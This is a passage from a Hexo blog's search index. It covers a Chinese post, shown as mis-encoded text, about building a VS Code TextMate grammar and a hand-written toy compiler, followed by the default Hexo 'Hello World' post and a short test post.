class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;$schema&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://raw.githubusercontent.com/martinring/tmlanguage/master/tmlanguage.json&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;minic&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#keywords&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#type&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#number&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#id&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#comment&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;repository&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;support.type.primitive.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b(void|int|bool)\\b&quot;</span> <span class="hljs-comment">// ç±»å‹</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;keywords&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;keyword.control.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b(if|while|for|return|else)\\b&quot;</span> <span class="hljs-comment">// å…³é”®å­—</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;number&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;constant.numeric.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b[0-9]+\\b&quot;</span> <br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;id.name.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b[a-z][a-z0-9]*\\b&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;comment&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;comment.line.double-dash&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^//.*&quot;</span> <span class="hljs-comment">//æ³¨é‡Š</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;scopeName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;source.mc&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure></p><p>è¸©å‘ç‚¹ï¼š</p><ol type="1"><li><p>å› ä¸ºæ˜¯æ ¹æ®åˆ†è¯ tokené‚£ä¸€å¥—æ¥çš„ï¼Œå…¶å®ä¹Ÿå°±æ˜¯å¯¹ä½ çš„è¯­è¨€çš„æ–‡ä»¶åç¼€åï¼Œæ¯”å¦‚æˆ‘è¿™é‡Œæ˜¯ mcåç¼€ï¼Œä¼šåšä¸€ä¸ªè¯æ³•åˆ†æï¼Œè¯æ³•åˆ†æçš„æ­£åˆ™æ˜¯è‡ªå·±ç¼–å†™çš„ï¼Œç„¶åæ¯ä¸ªæ­£åˆ™ä¹Ÿæœ‰å¯¹åº”çš„nameï¼Œvscode åœ¨é…ç½®(setting.json æ–‡ä»¶)é‡Œå¯ä»¥æ ¹æ®è¿™äº› nameåšé¢œè‰²çš„æ˜ å°„ã€‚æ‰€ä»¥ä¸€å®šè¦è®°å¾—ç®€å•çš„æ­£åˆ™è¦åœ¨ä¸¤è¾¹åŠ \b\bï¼Œè¡¨ç¤ºå•è¯åˆ†ç•Œï¼Œæˆ‘ä¸€å¼€å§‹æ²¡åŠ è¿™ä¸ªæ€»æ˜¯ä¸ç”Ÿæ•ˆ</p></li><li><p>å…³äº nameçš„å‘½åï¼Œå…¶å®æœ‰ä¸€å¥—è§„èŒƒçš„æ ‡å‡†ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥éšå¿ƒè‡ªå®šä¹‰ï¼Œæˆ‘è¿™é‡Œçš„ï¼Ÿï¼Ÿï¼Ÿå°±æ˜¯è‡ªå®šä¹‰çš„ã€‚</p></li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> myExtension<br><span class="hljs-variable">$</span> vsce package<br><span class="hljs-comment"># ç”Ÿæˆ myExtension.vsix,è¿™æ—¶å€™æœ¬åœ°å¯ä»¥çœ‹åˆ°ä¸€äº›äºŒè¿›åˆ¶æ’ä»¶æ–‡ä»¶</span><br><span class="hljs-variable">$</span> vsce publish<br><br></code></pre></td></tr></table></figure><p>å¦‚æœä»¥å‰æ²¡æœ‰ vscode æ’ä»¶å¸‚åœºçš„è´¦æˆ·éœ€è¦æ³¨å†Œhttps://code.visualstudio.com/api/working-with-extensions/publishing-extensionæ³¨å†Œå®Œä¹‹åï¼Œè®°å¾—æœ¬åœ°ä¿å­˜ä¸‹å¯†é’¥ï¼Œå› ä¸ºä¼šç»å¸¸ç”¨çš„</p><p>å–æ¶ˆå‘å¸ƒçš„æ’ä»¶ï¼š vsce unpublish -p å¯†é’¥ åŒ… id åŒ… id å¯ä»¥åœ¨ vscodeçš„å¯¹åº”æ’ä»¶çš„ä¿¡æ¯é‡Œå¯ä»¥çœ‹åˆ°ï¼Œ(ä¸€èˆ¬ç‚¹å‡»æ’ä»¶çš„è®¾ç½®å›¾æ ‡å°±å¯ä»¥çœ‹åˆ°åŒ… idé€‰é¡¹)</p><p>TextMate è¯­æ³•æœ€å¥½å¯¹æ­£åˆ™æ¯”è¾ƒç†Ÿæ‚‰ å…·ä½“çš„è¯¦ç»†èµ„æ–™ï¼šhttps://code.visualstudio.com/api/language-extensions/semantic-highlight-guide#semantic-token-scope-map</p><p>https://macromates.com/manual/en/language_grammars#naming-conventionsï¼ˆTextMateè¯­æ³•è§„åˆ™ï¼‰https://macromates.com/manual/en/regular_expressionsï¼ˆç›¸å…³æ­£åˆ™ï¼‰</p><h2 id="ä¹å‰ç«¯å¯è§†åŒ–">ä¹ã€å‰ç«¯å¯è§†åŒ–</h2><p>canvas</p><p>é¡¹ç›®è¸©å‘ç‚¹ï¼š</p><ol type="1"><li>æˆ‘æœ¬åœ°å…¨å±€å’Œé¡¹ç›®ä¸‹éƒ½æ˜¯å®‰è£…äº† ts-nodede1ï¼Œä½†æ˜¯é€šè¿‡ npm runts-nodeï¼Œå°±æ˜¯èµ·ä¸èµ·æ¥ï¼šCannot find module'typescript'ï¼Œåæ¥åœ¨https://github.com/TypeStrong/ts-node/issues/707ï¼Œå¥½åƒæ˜¯ç‰ˆæœ¬çš„é—®é¢˜ï¼Œæ‰¾åˆ°äº†æœ€å¥½çš„è§£å†³æ–¹æ¡ˆï¼šnpmlink typescriptï¼Œå†è¿è¡Œå³å¯</li></ol><p>é¡¹ç›®éš¾ç‚¹ï¼šå…¶å®æ•´ä¸ªé¡¹ç›®æ˜¯åœ¨å­¦ä¹ æ–¯å¦ç¦ç¼–è¯‘åŸç†çš„æ—¶å€™æœ‰é¡ºä¾¿ä¸€èµ·å†™çš„ï¼Œå†™ä¸‹æ¥ä¹ŸæŒºç´¯çš„ï¼Œå› ä¸ºå·²ç»åœ¨å·¥ä½œäº†ï¼Œåœ¨ç¼–å†™æœ¬é¡¹ç›®å‰ï¼Œä¹Ÿçœ‹äº†ä¸‹æ–¯å¦ç¦çš„cool æºç ï¼Œç„¶åäº†è§£äº†ä¸‹ bison å’Œflexï¼Œé¡ºä¾¿å¯¹ç…§äº†äº†ä¸‹è™ä¹¦çš„ä¼ªä»£ç ï¼Œä¸‹é¢æ€»ç»“ä¸‹ä¸€äº›æ¯”è¾ƒé‡è¦æˆ–è€…å›°éš¾çš„ç‚¹ï¼š</p><ol type="1"><li><p>æ­£åˆ™è¡¨è¾¾å¼éƒ¨åˆ†ï¼Œè¿™ä¸€éƒ¨åˆ†çº¯ç²¹è‡ªå·±æ‰‹å†™ï¼Œä»£ç è®¾è®¡å¯èƒ½çœ‹ç€æœ‰ç‚¹é‚‹é¢ï¼Œä¸»è¦æ€æƒ³æ˜¯å€Ÿé‰´è™ä¹¦ä¸Šçš„ï¼Œè™ä¹¦åªç”»äº†å‡ ä¸ªå›¾ï¼Œä¹Ÿæ²¡æœ‰ç»™ä¼ªä»£ç ï¼Œä¸»è¦æ˜¯æ€ä¹ˆè®¾è®¡nfaçš„èŠ‚ç‚¹ç›¸å…³æ•°æ®ç»“æ„å­˜å‚¨ï¼Œä¸€ä¸ªæ˜¯æ˜¯ç”¨ç®€å•çš„é“¾è¡¨ï¼Œåé¢å‘ç°å¯èƒ½å­˜åœ¨å‡ºåº¦ä¸ºå¤šä¸ªçš„èŠ‚ç‚¹ï¼Œå°±æ¢ç”¨é‚»æ¥è¡¨å­˜å‚¨äº†ï¼Œæ¯ä¸ªèŠ‚ç‚¹çš„ä¿¡æ¯åŒ…å«äº†æ‰€æœ‰å…¥åº¦è¾¹çš„ä¿¡æ¯ï¼›å…¶æ¬¡æ­£åˆ™è¡¨è¾¾å¼åˆ†æè¿™é‡Œç”¨çš„ä¹Ÿæ˜¯stack å¯¹æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œåˆ†æï¼Œæ ˆå†…çš„å…ƒç´ å¯èƒ½æ˜¯èŠ‚ç‚¹ä¹Ÿå¯èƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œåœ¨æ¯æ¬¡popçš„æ—¶å€™éœ€è¦æ³¨æ„å¯¹å½“å‰å‡ºæ ˆçš„èŠ‚ç‚¹è¿›è¡Œéå†æ‹¿åˆ°å¤´å°¾èŠ‚ç‚¹ï¼Œæ–¹ä¾¿èŠ‚ç‚¹ä¹‹é—´çš„è¿æ¥ã€‚ç„¶åæ˜¯å°†å„ä¸ªnfa è”åˆæˆä¸€ä¸ªå¤§ nfa çš„è¿‡ç¨‹ï¼Œé‡‡ç”¨ dfa + bfa + å¤‡å¿˜å½• + å›æº¯ï¼›æœ€å¥½æ˜¯å°†nfa =&gt; dfa çš„è¿‡ç¨‹ï¼Œè¿™ä¸€éƒ¨åˆ†å‚ç…§ä¼ªä»£ç çš„ï¼Œåº”è¯¥æ²¡å•¥å¤§é—®é¢˜ï¼›</p></li><li><p>ast ç”Ÿæˆéƒ¨åˆ†ï¼šè¿™ä¸€æ­¥æ–‡æ³•åˆ†æè¡¨ç”Ÿæˆæ˜¯å‚ç…§ä¼ªä»£ç çš„ï¼Œåé¢çš„ astç”Ÿæˆè¿‡ç¨‹æ˜¯çº¯æ‰‹å†™ï¼Œå…¶å®åœ¨å®ç°çš„è¿‡ç¨‹ä¸­ï¼Œä¹Ÿå‘ç°æ•´ä¸ªè¿‡ç¨‹å’Œ bison çš„ yyæ–‡ä»¶å¦‚å‡ºä¸€è¾™ï¼Œä¸çŸ¥é“ bison æ˜¯æ€ä¹ˆå®ç°çš„ ğŸ˜¯ï¼Œæœ¬æ¥æ˜¯æƒ³å¼„æˆç®€å•çš„ bisonæ–‡ä»¶ç¼–å†™æ–‡æ³•è§„åˆ™çš„ï¼Œä½†æ˜¯æ—¶é—´ä¸å…è®¸ï¼Œåé¢å†æŠ½ç©ºçœ‹ä¸‹ã€‚astç”Ÿæˆè¿™ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯åœ¨è§„çº¦åŠ¨ä½œä¸Šæ”¾ç½®ä¸€äº›ç”¨æˆ·å®šä¹‰åŠ¨ä½œï¼Œè¿™é‡Œå°±æ˜¯å†™æ­»çš„ç”Ÿæˆå¯¹åº”æ–‡æ³•è¡¨è¾¾å¼çš„ç±»ï¼Œè‡ªåº•å‘ä¸Šæ„å»ºast</p></li><li><p>è¿™æ¯”ä¸€éƒ¨åˆ†ç†è®ºå…¶å®æŒºå¤šçš„ï¼Œä½†æ˜¯åœ¨æœ¬é¡¹ç›®é‡Œåªè¦è€ƒè™‘å‘¨åˆ°å³å¯ï¼Œé˜²æ­¢åœ¨ç¼–è¯‘çš„æœ€å¥½é˜¶æ®µæŠ¥é”™ï¼Œä¹Ÿæ˜¯çº¯æ‰‹å†™çš„</p></li><li><p>æ±‡ç¼–ç”Ÿæˆéƒ¨åˆ†ï¼šè¿™ä¸€éƒ¨åˆ†ä¸ªäººè§‰å¾—æœ€æ¶å¿ƒäº†ï¼Œå› ä¸ºæ±‡ç¼–æ¯”è¾ƒéš¾è°ƒè¯•ï¼Œæ¯æ¬¡æœ‰bugéƒ½éœ€è¦æ±‡ç¼–è¯­å¥ä¸€å¥ä¸€å¥çœ‹ï¼Œå…¶å®å›è¿‡å¤´çœ‹ï¼Œè¿™æ ·æŠŠå…ƒè¡¨è¾¾å¼ï¼ˆåƒ+-<em>/èµ‹å€¼è¯­å¥ï¼‰çš„å¯„å­˜å™¨åˆ†é…è®¾è®¡å†™å¥½äº†ï¼Œå°±å¯ä»¥æ‹¿å®ƒä»¬ç»„åˆæˆæ›´å¤§çš„åŸä»¶ã€‚è¿™é‡Œä¹Ÿæ˜¯çº¯æ‰‹å†™çš„ï¼Œæœ‰ä¸€ä¸ªæ¯”è¾ƒå›°æ‰°æˆ‘çš„ç‚¹ï¼Œåƒif-elseé‡Œé¢å£°æ˜çš„å˜é‡å¦‚ä½•åœ¨è¿è¡Œæ—¶å€™åˆ†é…å†…å­˜ï¼Ÿæˆ‘ä»¬éƒ½çŸ¥é“å±€éƒ¨å˜é‡åœ¨ä¸è€ƒè™‘ç”¨å¯„å­˜å™¨ä¼˜åŒ–çš„æƒ…å†µä¸‹ï¼Œä¸€èˆ¬éƒ½æ˜¯å­˜å‚¨åœ¨æ ˆå†…çš„ï¼Œåƒå‚æ•°éƒ½æ˜¯åŸºäºfp(æ ˆæŒ‡é’ˆ)è¿›è¡Œå¯»å€çš„ï¼Œæ¯”å¦‚å½¢å¼å‚æ•° x,yï¼Œåœ¨ç”Ÿæˆæ±‡ç¼–çš„æ—¶å€™å°±è¦è®°å½•ï¼Œè¿™é‡Œæˆ‘æ‹¿æ•°ç»„çš„[x, y]ï¼Œè¿™æ · x çš„åç§»é‡å°±æ˜¯fp + 1 </em> 4, y å°±æ˜¯ fp + 2 * 4ï¼Œä½†æ˜¯åƒ if elseé‡Œé¢çš„å£°æ˜çš„å˜é‡åªæœ‰è¿è¡Œåˆ°å¯¹åº”çš„åˆ†æ”¯æ‰èƒ½åˆ†é…å†…å­˜ï¼Œä¹Ÿå°±æ˜¯è¯´å¦ä¸€ä¸ªæ²¡æœ‰æ‰§è¡Œçš„åˆ†æ”¯æ˜¯ä¸éœ€è¦åˆ†é…å†…å­˜çš„ã€‚</p></li><li><p>å‰ç«¯éƒ¨åˆ†ï¼šç”¨çš„æ˜¯åŸç”Ÿ canvasï¼Œä¸»è¦æ˜¯å¹³æ—¶å·¥ä½œå¾ˆå°‘ç”¨canvasï¼Œä¹‹å‰å­¦è¿‡ï¼Œä¸ç”¨å°±å¿˜ï¼Œé¡ºä¾¿å­¦ä¹ ä¸‹ï¼Œä¸»è¦æ˜¯æ•´ä¸ª canvasç±»çš„è®¾è®¡å§ã€‚</p></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/emocoder/2023/02/27/hello-world/"/>
    <url>/emocoder/2023/02/27/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your veryfirst post. Check <a href="https://hexo.io/docs/">documentation</a> formore info. If you get any problems when using Hexo, you can find theanswer in <ahref="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> oryou can ask me on <ahref="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start">Quick Start</h2><h3 id="create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <ahref="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <ahref="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <ahref="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <categories>
      
      <category>Test</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>My New Post</title>
    <link href="/emocoder/2023/02/27/My-New-Post/"/>
    <url>/emocoder/2023/02/27/My-New-Post/</url>
    
    <content type="html"><![CDATA[<p>ä½ å¥½</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
